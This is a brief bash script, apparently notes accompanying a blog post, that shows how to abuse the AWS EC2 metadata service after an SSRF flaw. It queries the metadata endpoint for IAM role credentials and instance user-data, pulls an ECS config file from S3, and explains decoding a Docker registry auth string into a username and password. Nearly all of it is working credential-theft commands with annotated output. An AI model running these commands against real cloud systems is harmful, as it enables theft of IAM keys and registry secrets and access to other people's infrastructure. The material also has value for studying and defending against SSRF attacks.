#!/bin/bash

# Ref: https://blog.christophetd.fr/abusing-aws-metadata-service-using-ssrf-vulnerabilities/

# ecsInstanceRole is a default IAM role with the following policy attached to it:
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ecsInstanceRole

# This endpoint returns a user-defined script which is run every time a new EC2 instance is launched for
# the first time. This script is typically used for basic provisioning such as updating packages, running
# a service, and obviously sometimes for storing sensitive information (even if that’s discouraged).
curl http://169.254.169.254/latest/user-data

# E.g.
# aws s3 cp s3://ecs-conf/ecs.config /etc/ecs/ecs.config
# docker pull ...
# nrsysmond-config -set license_key=...

aws s3 cp s3://ecs-conf/ecs.config ecs.config
cat ecs.config

# Output: ...
# -------------------
# ECS_ENGINE_AUTH_TYPE=dockercfg
# ECS_ENGINE_AUTH_DATA={"https://index.docker.io/v1/":{"auth":"M30s[...redacted...]hV=","email":"deploy@[...redacted...].co"}}

# The auth parameter is a base-64 encoded string which decodes to codewarsdeploy:somepassword (the password
# has been redacted) and allows us to login to the private Docker registry
